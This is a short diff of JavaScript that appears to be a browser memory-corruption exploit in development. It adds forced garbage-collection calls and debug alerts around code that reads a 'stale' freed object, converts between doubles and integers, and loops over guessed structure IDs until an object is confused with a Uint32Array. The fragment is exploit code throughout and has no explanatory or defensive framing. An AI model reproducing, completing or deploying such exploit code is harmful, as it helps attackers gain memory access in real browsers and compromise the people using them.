@@ -173,12 +173,20 @@ for (var i = 0; i < 0x1000; i++){
 				
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
+				
+				dgc();
+				dgc();
+				dgc();
+				dgc();
+				
 				alert("Gonna access stale");
 				sa = d2u(stale[1]['a']);
 				alert("sa.hi=" + sa.hi);
 				alert("sa.low=" + sa.low);
+				
 				alert("After accesing stale");
 				while(!(stale[0] instanceof Uint32Array)) {
+				    alert("In while");
 				    structID++;
 				    stale[1]['a'] = u2d(structID, 0);
 				    //alert(structID);
